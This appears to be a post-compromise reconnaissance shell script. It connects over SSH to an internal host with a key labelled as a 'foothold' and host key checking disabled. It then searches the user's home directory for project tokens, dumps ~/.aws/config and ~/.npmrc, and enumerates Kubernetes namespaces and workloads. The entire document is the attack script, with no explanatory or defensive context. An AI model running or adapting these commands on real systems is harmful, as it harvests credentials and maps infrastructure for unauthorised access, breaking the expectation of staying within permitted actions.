SSH="ssh -o StrictHostKeyChecking=no -o BatchMode=yes -i $HOME/.ssh/keplerops-foothold -p 2222 rowan@10.50.13.180"
$SSH 'bash -s' <<'REMOTE'
echo "### grep home for arwc/connector/planner/order tokens"
grep -rIl -i -E "arwc|connector|planner|work.?order|inspection" ~ 2>/dev/null | grep -v -E "\.cache|\.config/chromium|work/fieldlink-connector/\.git" | head -60
echo "### config dirs"
find ~/.config ~/.local -maxdepth 3 -type f 2>/dev/null | head -60
echo "### aws"
ls -la ~/.aws 2>/dev/null; cat ~/.aws/config 2>/dev/null; cat ~/.npmrc 2>/dev/null
echo "### kube"
kubectl get ns 2>&1 | head
kubectl -n fieldlink get all 2>&1 | head -40
REMOTE
